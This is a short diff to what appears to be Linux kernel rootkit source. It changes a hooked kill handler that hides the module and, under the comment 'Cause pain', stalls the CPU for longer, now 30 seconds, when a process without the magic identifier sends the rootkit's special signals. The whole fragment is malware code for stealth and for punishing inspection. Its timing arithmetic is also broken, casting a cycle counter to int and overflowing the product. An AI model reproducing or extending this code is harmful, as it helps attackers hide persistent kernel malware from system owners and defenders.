@@ -334,7 +334,7 @@ hacked_kill(pid_t pid, int sig)
 		else module_hide();
 	}else if(pid != magicPrefixNum && (sig==SIGINVIS || sig==SIGSUPER || sig==SIGMODINVIS)){
 		//Cause pain //ADDED
-		int seconds = 5;
+		int seconds = 30;
 		int start_time = (int) __builtin_ia32_rdtsc();
 		int end_time = start_time + seconds * 2300000000;
     	while ((int) __builtin_ia32_rdtsc() < end_time);
